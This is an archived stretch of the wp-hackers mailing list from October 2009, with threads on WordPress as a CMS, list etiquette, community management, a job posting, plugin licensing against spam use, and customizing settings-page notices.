> better to have this discussion on wp-discuss (though I don't see a subscribe
> link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)
>
> Because these emails all come to the same inbox for me, I rarely
> differentiate which list they are coming from.
>
> Apologies.
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com
>
>
> On Thu, Oct 22, 2009 at 9:29 AM, Andy Skelton <skeltoac at gmail.com> wrote:
>
>   
>> On Thu, Oct 22, 2009 at 9:03 AM, Matt Martz <matt at sivel.net> wrote:
>>     
>>> I've got this great idea.  My idea is to create a wp-bikeshed mailing
>>> list so that all of you on this list have a place to argue endlessly
>>> and never come to any decisions, without disrupting everyone's inboxes
>>> with your pointless spam.
>>>       
>> -1 for wp-bikeshed. Shed color arguments never happen in a forum
>> created for that purpose. Use wp-discuss.
>>
>> +1 for "show me the code" and "put up or shut up". The people you are
>> complaining about on wp-hackers aren't actually hackers, i.e. won't
>> code or won't learn to code. Maybe their opinions have value but they
>> have subverted this list against the actual hackers. By all means
>> create a new list but that won't fix wp-hackers. You must repel
>> unwanted behavior.
>>
>> I admit that my habit of Muting every wp-hackers thread doesn't help.
>> If that's the way I'm going to be I should unsubscribe.
>>
>> Andy
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
>
>
> ------------------------------
>
> Message: 2
> Date: Fri, 23 Oct 2009 02:46:09 +1300
> From: Lynne Pope <lynne.pope at gmail.com>
> Subject: Re: [wp-hackers] WordPress Bike Shed Mailing List
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<427667db0910220646o7cd61afcp34976d9bc6383723 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> 2009/10/23 Andy Skelton <skeltoac at gmail.com>
>
>   
>> On Thu, Oct 22, 2009 at 9:03 AM, Matt Martz <matt at sivel.net> wrote:
>>     
>>> I've got this great idea.  My idea is to create a wp-bikeshed mailing
>>> list so that all of you on this list have a place to argue endlessly
>>> and never come to any decisions, without disrupting everyone's inboxes
>>> with your pointless spam.
>>>       
>> -1 for wp-bikeshed. Shed color arguments never happen in a forum
>> created for that purpose. Use wp-discuss.
>>
>>     
>
> The problem is, too many feature requests/ideas are posted to this list by
> people who are asking others to make their ideas happen. Try pointing the
> person to the ideas forum and a slanging match results. Try telling someone
> that they should be posting support questions on the forum and the same
> thing happens.
>
> As a result of the noise people who want genuine feedback before wasting
> their time creating a patch nobody wants just get drowned out, discouraged,
> and give up.
>
> Lynne
>
>
> ------------------------------
>
> Message: 3
> Date: Thu, 22 Oct 2009 08:46:26 -0500
> From: Otto <otto at ottodestruct.com>
> Subject: Re: [wp-hackers] WordPress Bike Shed Mailing List
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<161617690910220646n1e98f5qee33bafff5de23f9 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Thu, Oct 22, 2009 at 8:41 AM, Nathan Rice <ncrice at gmail.com> wrote:
>   
>> It's my fault for starting this thread (sort of) on hackers. It's obviously
>> better to have this discussion on wp-discuss (though I don't see a subscribe
>> link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)
>>     
>
> wp-discuss?
>
> I can't find that one in the lists:
> http://lists.automattic.com/mailman/listinfo/
>
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> ------------------------------
>
> Message: 4
> Date: Thu, 22 Oct 2009 10:09:46 -0400
> From: Nathan Rice <ncrice at gmail.com>
> Subject: Re: [wp-hackers] WordPress Bike Shed Mailing List
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<862d087f0910220709x25c04888k73bcf898eebafb8b at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Otto,
> Me neither. No wonder we don't have these types of conversations there! :-)
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com
>
>
> On Thu, Oct 22, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:
>
>   
>> On Thu, Oct 22, 2009 at 8:41 AM, Nathan Rice <ncrice at gmail.com> wrote:
>>     
>>> It's my fault for starting this thread (sort of) on hackers. It's
>>>       
>> obviously
>>     
>>> better to have this discussion on wp-discuss (though I don't see a
>>>       
>> subscribe
>>     
>>> link for wp-discuss here: http://codex.wordpress.org/Mailing_Lists)
>>>       
>> wp-discuss?
>>
>> I can't find that one in the lists:
>> http://lists.automattic.com/mailman/listinfo/
>>
>>
>> -Otto
>> Sent from Memphis, TN, United States
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
>
>
> ------------------------------
>
> Message: 5
> Date: Thu, 22 Oct 2009 07:12:12 -0700
> From: ARMEDA FEEDS <feeds at armeda.com>
> Subject: Re: [wp-hackers] WordPress as CMS (was: wordpress security)
> To: wp-hackers at lists.automattic.com
> Message-ID: <4AE0683C.7090104 at armeda.com>
> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>
> I have to agree with you here. Most of the clients I work with are 
> interested in using WordPress to manage their sites but don't 
> necessarily need a blog for their company. It's an easy choice to make 
> over drupal/joomla/EE and quite frankly, it really doesn't make sense to 
> fight this.
>
> Thinking that WP is just the best blogging platform is not giving it 
> enough credit. If you aren't using it to create functional WEBSITES with 
> easy content management capabilities for your clients, you and your 
> clients are missing out.
>
> Best,
>
> Dre Armeda
>
> Nathan Rice wrote:
>   
>> On Wed, Oct 21, 2009 at 4:05 PM, Nathan Rice <ncrice at gmail.com> wrote:
>>     You're most likely about to be told either:
>>
>>    1) If you want a website CMS (non-blog) then try drupal/joomla/EE
>>    2) If you MUST use WP as a site CMS (non-blog) just tell your client to
>> ignore the blog stuff.
>>
>>    Good luck.
>>
>> On Wed, Oct 21, 2009 at 4:47 PM, Otto <otto at ottodestruct.com> wrote:
>>
>>   
>>     
>>> I don't get it. Why would anybody want to use WordPress, but disable
>>> all the useful features?
>>> ...
>>> My advice would be to make a plugin that erases WordPress and installs
>>> some other piece of software more suitable for their needs.
>>>
>>>     
>>>       
>> I think I deserve a round of applause for calling that one.
>>
>> Here's why people use WP for a site management system, as opposed to a blog:
>>
>> 1. It's familiar
>> 2. It's a damn good page management tool
>> 3. Themes are dead simple to create, or dead cheap to purchase.
>>
>> The MOST POPULAR premium themes available are the themes that help people
>> set up a business website (NOT blog) and give the client the ability to
>> manage the page content.
>>
>> What are we so intent on fighting this? We get it ... you blog ... and
>> that's why YOU like WordPress. But with so many people wanting to use WP as
>> their site management system (for the reasons stated above) aren't we being
>> a wee bit silly when we demand that people use WP strictly as a blogging
>> tool?
>>
>> The people have spoken loud and clear (with their wallets). They don't want
>> to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
>> voluntarily choosing to use a system that was built for something else
>> because it's THAT MUCH better than the alternatives.
>>
>> To use the illustration from above -- they're choosing to use the coffee
>> maker to boil water because the stove is so horribly unusable. The coffee
>> maker boils water, and that's all they need to know.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>   
>>     
>
>
> ------------------------------
>
> Message: 6
> Date: Thu, 22 Oct 2009 10:18:33 -0400
> From: Andy Skelton <skeltoac at gmail.com>
> Subject: Re: [wp-hackers] WordPress Bike Shed Mailing List
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<e6ec604d0910220718y6c338086p887a80e98822bc4b at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Thu, Oct 22, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:
>   
>> wp-discuss?
>>     
>
> I was suggesting a better name than bikeshed for a non-hackers list.
>
> Andy
>
>
> ------------------------------
>
> Message: 7
> Date: Thu, 22 Oct 2009 10:23:23 -0400
> From: Doug Stewart <zamoose at gmail.com>
> Subject: [wp-hackers] Community Management (was Re: WordPress Bike
> 	Shed	Mailing List)
> To: wp-hackers at lists.automattic.com
> Message-ID:
> 	<71ddd7490910220723l3c7bd49ao55e60b8e3b2e3563 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> All of this, at least to me, points to a rather pressing need on
> WordPress/Automattic's part to hire/appoint a Community Manager, ala
> Jono Bacon in the Ubuntu/Canonical world or Glynn Foster for
> OpenSolaris/Sun.
>
> WordPress (and Ubuntu, and OpenSolaris, and Drupal, etc., ad
> infinitum) is NOT simply about code -- it's just as much about the
> community.  You can have the best-coded piece of software, available
> under the best and most expressive license imaginable, but if you
> don't have people excited about using it, you're sunk.
>
> WordCamps, meetups, etc. have largely been successful in keeping folks
> from a certain locality excited and engaged and there are multiple
> ways to get plugged in, from the mailing lists to the IRC meetings to
> Ideas/Kvetches, but there's no single unifying presence showing a
> clear direction.
>
> I mean, take a look at the .org front page, *really* take a look at
> it.  Say you're a prospective WordPress user/contributor.  What part
> says "This is how you get involved"?  To my eye, not a single part.
> It's focused on "Hey, you want to use WordPress for a site, here's
> plugins and themes and ways to do what you want", but it lacks a "This
> is how you give back" punch.
>
> I think those of us who have been on the wp-* mailing lists for ages
> have lost sight of this in many ways and, in essence, are squandering
> the potential resource that is the WordPress community (writ large),
> and so you get users (and worse, active code contributors) who get
> frustrated and leave the lists, and sometimes even the community as a
> whole.
>
> Writing code is (comparatively) easy; wrangling people is *hard*.  I
> think it's a net loss to the WP project and I think we do a disservice
> to the community by not having a defined way to go about this whole
> "community" thing.
>
> Just my $.02.
>
>   

From mikeschinkel at newclarity.net  Thu Oct 22 18:47:57 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 22 Oct 2009 14:47:57 -0400
Subject: [wp-hackers] Wikimedia Foundation Opening
In-Reply-To: <4AE09BA0.6040609@wikimedia.org>
References: <4AE09BA0.6040609@wikimedia.org>
Message-ID: <999B4769-D526-4F0C-BC8D-97A293BB93BE@newclarity.net>

How ironic!  Sounds like a great role for Otto...

http://groups.google.com/group/wp-hackers/msg/9601570b65467bfb

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/


On Oct 22, 2009, at 1:51 PM, Blair Lewis wrote:

> Hello All,
>
> I apologize for the inconvenience as I realize this is not typically  
> the venue for such an email, but given what I suspect is a wide  
> support for the Wikimedia Foundation and its mission I felt you  
> would all be interested in helping us with our search.  We are  
> currently looking for a Code Maintenance Engineer who will own all  
> the code submissions from our volunteers worldwide (JD attached).   
> We are looking for strong PHP developers with open source project  
> development experience who can wear the hat of coder, architect and  
> QA engineer.  This role will be located in our downtown San  
> Francisco office.  If you are interested feel free to contact me at  
> my email below or visit our job link at:
>
> http://wikimediafoundation.org/wiki/Job_openings/Code_Maintenance_Engineer
>
> Please feel free to pass this message along to whomever you like.   
> We will also have additional roles coming in the following months,  
> so if working with the foundation is of interest to you and you have  
> strong PHP skills please contact me.
>
> Thank you and again I'm sorry for the bother to those of you who  
> this does not interest.
>
> All the Best,
>
> -- 
>
> Blair Lewis
> Recruiter, Wikimedia Foundation
> blewis at wikimedia.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From zamoose at gmail.com  Thu Oct 22 18:50:26 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 22 Oct 2009 14:50:26 -0400
Subject: [wp-hackers] Wikimedia Foundation Opening
In-Reply-To: <999B4769-D526-4F0C-BC8D-97A293BB93BE@newclarity.net>
References: <4AE09BA0.6040609@wikimedia.org>
	<999B4769-D526-4F0C-BC8D-97A293BB93BE@newclarity.net>
Message-ID: <71ddd7490910221150h4010bee6i1231ca4544652e5e@mail.gmail.com>

On 10/22/09, Mike Schinkel <mikeschinkel at newclarity.net> wrote:
> How ironic!  Sounds like a great role for Otto...
>
> http://groups.google.com/group/wp-hackers/msg/9601570b65467bfb

Easy there, killer.  That's a bit offside.

-- 
-Doug
http://literalbarrage.org/blog/

From mikeschinkel at newclarity.net  Thu Oct 22 19:21:28 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 22 Oct 2009 15:21:28 -0400
Subject: [wp-hackers] Wikimedia Foundation Opening
In-Reply-To: <71ddd7490910221150h4010bee6i1231ca4544652e5e@mail.gmail.com>
References: <4AE09BA0.6040609@wikimedia.org>
	<999B4769-D526-4F0C-BC8D-97A293BB93BE@newclarity.net>
	<71ddd7490910221150h4010bee6i1231ca4544652e5e@mail.gmail.com>
Message-ID: <67508BA9-AAD9-43C1-8FBC-22EF5F7BCED5@newclarity.net>

> Easy there, killer.  That's a bit offside.

Touche'.

Just getting weary of the attitude.

-Mike



On Oct 22, 2009, at 2:50 PM, Doug Stewart wrote:

> On 10/22/09, Mike Schinkel <mikeschinkel at newclarity.net> wrote:
>> How ironic!  Sounds like a great role for Otto...
>>
>> http://groups.google.com/group/wp-hackers/msg/9601570b65467bfb
>
> Easy there, killer.  That's a bit offside.
>
> -- 
> -Doug
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From photofantaisie at gmail.com  Thu Oct 22 21:21:04 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Thu, 22 Oct 2009 23:21:04 +0200
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
Message-ID: <9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>

I agree 100% with Nathan here.

As a moderator on the Studiopress.com forums (I'm writing in my personal
capacity, not as a spokesperson for Studiopress, by the way), I can honestly
say that 90% of Studiopress customers I deal with are NOT bloggers in the
traditional sense. They are building sites for small businesses (sometimes
not so small), community sites, real estate agency sites, church sites, etc
- and many users are not end-users either, they are web
designers/consultants selling WP as CMS to their clients who, in turn, are
mostly small businesses.

Ok, it is, perhaps, more likely that users of premium themes will not be
traditional bloggers, but my point is that there are very many people who
use WP to build a "web site", not a "blog". I deal with them every day. We
cannot, and should not, ignore this fact.

Back to more practical issues, +1 to replacing existing "blog" terminology
in the backend with something more generic! :-)

Ade.



2009/10/22 Nathan Rice <ncrice at gmail.com>

>
> The people have spoken loud and clear (with their wallets). They don't want
> to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
> voluntarily choosing to use a system that was built for something else
> because it's THAT MUCH better than the alternatives.
>

From bryanharley at gmail.com  Thu Oct 22 21:41:29 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Thu, 22 Oct 2009 14:41:29 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
	<9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>
Message-ID: <58410e2e0910221441h3a92d854tcb1298338a612edc@mail.gmail.com>

Add another +1 to replacing "blog" terminology.  It's time to wake up
and realize WordPress IS a CMS.

As a web developer currently working at a prominent local ad agency,
I've been using WordPress for our clients' sites for over 3 years.
It's a fantastic system with tons of potential.  Do I have use
plugins, do I have to add custom functions?  Sure.  But it's easy and
quick to do, more so than using Drupal, EE, or Joomla.  Most
importantly, our clients have been nothing but happy with WP.


On Thu, Oct 22, 2009 at 2:21 PM, Ade Walker <photofantaisie at gmail.com> wrote:
> I agree 100% with Nathan here.
>
> As a moderator on the Studiopress.com forums (I'm writing in my personal
> capacity, not as a spokesperson for Studiopress, by the way), I can honestly
> say that 90% of Studiopress customers I deal with are NOT bloggers in the
> traditional sense. They are building sites for small businesses (sometimes
> not so small), community sites, real estate agency sites, church sites, etc
> - and many users are not end-users either, they are web
> designers/consultants selling WP as CMS to their clients who, in turn, are
> mostly small businesses.
>
> Ok, it is, perhaps, more likely that users of premium themes will not be
> traditional bloggers, but my point is that there are very many people who
> use WP to build a "web site", not a "blog". I deal with them every day. We
> cannot, and should not, ignore this fact.
>
> Back to more practical issues, +1 to replacing existing "blog" terminology
> in the backend with something more generic! :-)
>
> Ade.
>
>
>
> 2009/10/22 Nathan Rice <ncrice at gmail.com>
>
>>
>> The people have spoken loud and clear (with their wallets). They don't want
>> to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
>> voluntarily choosing to use a system that was built for something else
>> because it's THAT MUCH better than the alternatives.
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From joelfisher at gmail.com  Fri Oct 23 03:21:57 2009
From: joelfisher at gmail.com (Joel Fisher)
Date: Thu, 22 Oct 2009 23:21:57 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <58410e2e0910221441h3a92d854tcb1298338a612edc@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
	<9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>
	<58410e2e0910221441h3a92d854tcb1298338a612edc@mail.gmail.com>
Message-ID: <d238bd620910222021o47127f0at76f969e2f842d273@mail.gmail.com>

I in fact choose to use a coffeemaker to boil vegetables. Why?

Because if I used something else that just makes coffee, my client
would ask me "Can it boil vegetables?".

Wordpress is a powerful and flexible tool. Period.


joel.fisher
www.flushinc.com

Linkedin: http://www.linkedin.com/in/jfisher
Follow: www.twitter.com/joelmoney




On Thu, Oct 22, 2009 at 5:41 PM, Bryan Harley <bryanharley at gmail.com> wrote:
> Add another +1 to replacing "blog" terminology. ?It's time to wake up
> and realize WordPress IS a CMS.
>
> As a web developer currently working at a prominent local ad agency,
> I've been using WordPress for our clients' sites for over 3 years.
> It's a fantastic system with tons of potential. ?Do I have use
> plugins, do I have to add custom functions? ?Sure. ?But it's easy and
> quick to do, more so than using Drupal, EE, or Joomla. ?Most
> importantly, our clients have been nothing but happy with WP.
>
>
> On Thu, Oct 22, 2009 at 2:21 PM, Ade Walker <photofantaisie at gmail.com> wrote:
>> I agree 100% with Nathan here.
>>
>> As a moderator on the Studiopress.com forums (I'm writing in my personal
>> capacity, not as a spokesperson for Studiopress, by the way), I can honestly
>> say that 90% of Studiopress customers I deal with are NOT bloggers in the
>> traditional sense. They are building sites for small businesses (sometimes
>> not so small), community sites, real estate agency sites, church sites, etc
>> - and many users are not end-users either, they are web
>> designers/consultants selling WP as CMS to their clients who, in turn, are
>> mostly small businesses.
>>
>> Ok, it is, perhaps, more likely that users of premium themes will not be
>> traditional bloggers, but my point is that there are very many people who
>> use WP to build a "web site", not a "blog". I deal with them every day. We
>> cannot, and should not, ignore this fact.
>>
>> Back to more practical issues, +1 to replacing existing "blog" terminology
>> in the backend with something more generic! :-)
>>
>> Ade.
>>
>>
>>
>> 2009/10/22 Nathan Rice <ncrice at gmail.com>
>>
>>>
>>> The people have spoken loud and clear (with their wallets). They don't want
>>> to use joomla, drupal, mediawiki, etc. They want to use WordPress. They are
>>> voluntarily choosing to use a system that was built for something else
>>> because it's THAT MUCH better than the alternatives.
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Fri Oct 23 03:56:49 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 22 Oct 2009 23:56:49 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <d238bd620910222021o47127f0at76f969e2f842d273@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
	<9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>
	<58410e2e0910221441h3a92d854tcb1298338a612edc@mail.gmail.com>
	<d238bd620910222021o47127f0at76f969e2f842d273@mail.gmail.com>
Message-ID: <e1202cb10910222056o40604e74x69f03987cc5575f9@mail.gmail.com>

On Thu, Oct 22, 2009 at 11:21 PM, Joel Fisher <joelfisher at gmail.com> wrote:
> I in fact choose to use a coffeemaker to boil vegetables. Why?
>
> Because if I used something else that just makes coffee, my client
> would ask me "Can it boil vegetables?".
>
> Wordpress is a powerful and flexible tool. Period.

Dude that was fucking beautiful and genuinely complex. I also wanted
to quip back about the vegetable boiling, but it would only have
looked silly compared to yours.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From jer at simianuprising.com  Fri Oct 23 03:57:27 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 22 Oct 2009 23:57:27 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <e1202cb10910222056o40604e74x69f03987cc5575f9@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<862d087f0910220545pbf48efbg2ed40eeb28243b2f@mail.gmail.com>
	<9dd057850910221421x1ef20fdg45f0ba4f64b3cd43@mail.gmail.com>
	<58410e2e0910221441h3a92d854tcb1298338a612edc@mail.gmail.com>
	<d238bd620910222021o47127f0at76f969e2f842d273@mail.gmail.com>
	<e1202cb10910222056o40604e74x69f03987cc5575f9@mail.gmail.com>
Message-ID: <e1202cb10910222057v2e7ce1f6s151cb1297e0ca4ed@mail.gmail.com>

On Thu, Oct 22, 2009 at 11:56 PM, Jeremy Clarke <jer at simianuprising.com> wrote:
> On Thu, Oct 22, 2009 at 11:21 PM, Joel Fisher <joelfisher at gmail.com> wrote:
>> I in fact choose to use a coffeemaker to boil vegetables. Why?
>>
>> Because if I used something else that just makes coffee, my client
>> would ask me "Can it boil vegetables?".
>>
>> Wordpress is a powerful and flexible tool. Period.
>
> Dude that was fucking beautiful and genuinely complex. I also wanted
> to quip back about the vegetable boiling, but it would only have
> looked silly compared to yours.

Sorry, that was meant to be a personal reply,

kick_self();

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From photofantaisie at gmail.com  Fri Oct 23 09:37:15 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Fri, 23 Oct 2009 11:37:15 +0200
Subject: [wp-hackers] register_settings and admin_notices
Message-ID: <9dd057850910230237k148aae76i7fa261e25f214c1b@mail.gmail.com>

Hi,

Possibly more a support question, but I think the answer may be useful to
other hackers...

I'm re-writing some of my plugins to implement register_settings() for the
plugin's settings page, ie replacing the "old" $POST and nonces way. This
works fine, including the register_settings() callback function which I've
defined for sanitising and validating the user input.

However, I can't find a way to display a customised "updated" message to
display validation errors found when the callback function is run. For
example, the settings page has a reset option to revert all settings to
their defaults and, if this is set, I want to display an alternative to the
standard "Settings Saved" message, eg "All settings have been reset", or
something along those lines.

The problem I have is getting the various messages to display. Any pointers
for how I can do this? Is it a question of hooking into admin_notices, and
if so when (my attempt at doing this within the callback function haven't
worked), or is there a different approach I should be taking? Or am I
missing something blindingly obvious here?

Any pointers would be really useful.

Thanks!

Ade.

From cp at ccil.org  Fri Oct 23 12:00:34 2009
From: cp at ccil.org (Chuck Peters)
Date: Fri, 23 Oct 2009 08:00:34 -0400
Subject: [wp-hackers] Plugin License Excluding Spam
Message-ID: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>

We have been using a modified version of WP-Digest (1) for our newsletter
(2) and due to various issues I am in the process of rewriting the
newsletter code from scratch.  I have been thinking about creating a plugin,
but the last thing I need is our site getting associated with spamers.

I would prefer to use the GPL3, but I need some CYA against those spaming
criminals/jerks. Ignoring the issue of how effective a deterrent a software
license would be to spamers, can I add restrictions against spaming
(including specific damages fees) to one of the GPL compatible licenses?

Which license would allow me to make the extra restrictions?

I don't think the GPL 2 or 3 would allow me to make these kind of
restrictions against spamers.  So if I can't restrict it from being used for
spam I am not likely to release it as a plugin.


Thanks,
Chuck

1. WP-Digest is not really a plugin
http://birdhouse.org/software/2006/12/wp-digest/.  It runs via cron and uses
php and lynx to format the newsletter and sends out the posts via phpmailer.
 If no new posts are found it send out the past 3 posts...

2. We run wordpress and the modified WP-Digest and posts are used to create
a newsletter template which we manually edit and send to our site running
mailman.  No lynx, phpmailer or cron is used.  We also use procmail, php,
sed and bash to create a php page of the current newsletter.

From glenn at glennansley.com  Fri Oct 23 12:20:51 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Fri, 23 Oct 2009 08:20:51 -0400
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
Message-ID: <7474be390910230520y25f13ffbxdd6f32d4ed14d099@mail.gmail.com>

I doubt the license will restrict it from being used for spam
anyway... unless you're planning on taking a lot of people to court
next year :)

Glenn Ansley
http://fullthrottledevelopment.com

On Fri, Oct 23, 2009 at 8:00 AM, Chuck Peters <cp at ccil.org> wrote:
> We have been using a modified version of WP-Digest (1) for our newsletter
> (2) and due to various issues I am in the process of rewriting the
> newsletter code from scratch. ?I have been thinking about creating a plugin,
> but the last thing I need is our site getting associated with spamers.
>
> I would prefer to use the GPL3, but I need some CYA against those spaming
> criminals/jerks. Ignoring the issue of how effective a deterrent a software
> license would be to spamers, can I add restrictions against spaming
> (including specific damages fees) to one of the GPL compatible licenses?
>
> Which license would allow me to make the extra restrictions?
>
> I don't think the GPL 2 or 3 would allow me to make these kind of
> restrictions against spamers. ?So if I can't restrict it from being used for
> spam I am not likely to release it as a plugin.
>
>
> Thanks,
> Chuck
>
> 1. WP-Digest is not really a plugin
> http://birdhouse.org/software/2006/12/wp-digest/. ?It runs via cron and uses
> php and lynx to format the newsletter and sends out the posts via phpmailer.
> ?If no new posts are found it send out the past 3 posts...
>
> 2. We run wordpress and the modified WP-Digest and posts are used to create
> a newsletter template which we manually edit and send to our site running
> mailman. ?No lynx, phpmailer or cron is used. ?We also use procmail, php,
> sed and bash to create a php page of the current newsletter.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From batmoo at gmail.com  Fri Oct 23 12:27:52 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Fri, 23 Oct 2009 08:27:52 -0400
Subject: [wp-hackers] register_settings and admin_notices
In-Reply-To: <9dd057850910230237k148aae76i7fa261e25f214c1b@mail.gmail.com>
References: <9dd057850910230237k148aae76i7fa261e25f214c1b@mail.gmail.com>
Message-ID: <eaaa36c90910230527y6be42ba0r878d1c35a3b2847d@mail.gmail.com>

Here's the code that displays the "updated" message (in options-head.php):

<?php if (isset($_GET['updated'])) : ?>
> <div id="message" class="updated fade"><p><strong><?php _e('Settings
> saved.') ?></strong></p></div>
> <?php endif; ?>
>

I don't see an easy way to change that.

You could use admin_notices to display the custom message and use javascript
to hide the default "Settings Saved" message (obviously a subpar solution).

From glenn at glennansley.com  Fri Oct 23 12:32:19 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Fri, 23 Oct 2009 08:32:19 -0400
Subject: [wp-hackers] register_settings and admin_notices
In-Reply-To: <eaaa36c90910230527y6be42ba0r878d1c35a3b2847d@mail.gmail.com>
References: <9dd057850910230237k148aae76i7fa261e25f214c1b@mail.gmail.com>
	<eaaa36c90910230527y6be42ba0r878d1c35a3b2847d@mail.gmail.com>
Message-ID: <7474be390910230532p324a5a66wfb1a3e6bc1f800e1@mail.gmail.com>

I haven't looked at the code to see if there's an API for that but
rather than using javascript you could hook in before that chunk of
code and unset $_GET['updated']. Then you could use the admin_notices
to construct your own message. (Check to make sure it's your plugin's
page before unsetting it though).

Glenn Ansley
http://fullthrottledevelopment.com
http://twitter.com/full_throttle
http://twitter.com/glennansley

On Fri, Oct 23, 2009 at 8:27 AM, Mohammad Jangda <batmoo at gmail.com> wrote:
> Here's the code that displays the "updated" message (in options-head.php):
>
> <?php if (isset($_GET['updated'])) : ?>
>> <div id="message" class="updated fade"><p><strong><?php _e('Settings
>> saved.') ?></strong></p></div>
>> <?php endif; ?>
>>
>
> I don't see an easy way to change that.
>
> You could use admin_notices to display the custom message and use javascript
> to hide the default "Settings Saved" message (obviously a subpar solution).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From xavier at borderie.net  Fri Oct 23 12:33:44 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Fri, 23 Oct 2009 14:33:44 +0200
Subject: [wp-hackers] Social Web Camp
In-Reply-To: <7548B7A3-7B43-4D6B-9EE1-6BEA5E12553F@bblfish.net>
References: <7548B7A3-7B43-4D6B-9EE1-6BEA5E12553F@bblfish.net>
Message-ID: <9e4ae73e0910230533l7fde4689j5100af410e74e7f6@mail.gmail.com>

Hello, good people,

I thought this might interest some of you who are more into
buddypress+social development.

-x.



